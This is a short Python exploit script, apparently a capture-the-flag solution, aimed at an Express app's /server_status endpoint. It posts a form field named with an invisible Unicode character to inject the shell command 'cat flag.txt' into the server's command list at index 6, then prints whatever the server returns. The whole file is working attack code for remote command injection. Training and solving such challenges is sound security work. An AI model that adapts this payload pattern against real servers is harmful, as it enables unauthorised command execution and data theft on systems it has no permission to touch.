#!/usr/bin/env python3
import sys
import requests

def exploit(target_arg):
    # Parse the single ip:port argument
    if ":" not in target_arg:
        print("[-] Error: Target must be in the format IP:PORT")
        sys.exit(1)
        
    ip, port_str = target_arg.split(":", 1)
    try:
        port = int(port_str)
    except ValueError:
        print("[-] Error: Invalid port number.")
        sys.exit(1)
        
    base_url = f"http://{ip}:{port}/server_status"
    
    # The hidden unicode variable name used in the Express app
    hidden_key = "ㅤ"
    
    # Payload command to read the flag
    evil_command = "cat flag.txt"
    
    # Index 6 corresponds to the injected element in the commands array
    payload = {
        "choice": "6",
        hidden_key: evil_command
    }
    
    print(f"[*] Sending exploit payload to {base_url}...")
    try:
        response = requests.post(base_url, data=payload, timeout=5)
        print(f"\n[+] Status Code: {response.status_code}")
        print(f"[+] Response Output:\n{response.text}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <IP:PORT>")
        sys.exit(1)
        
    exploit(sys.argv[1])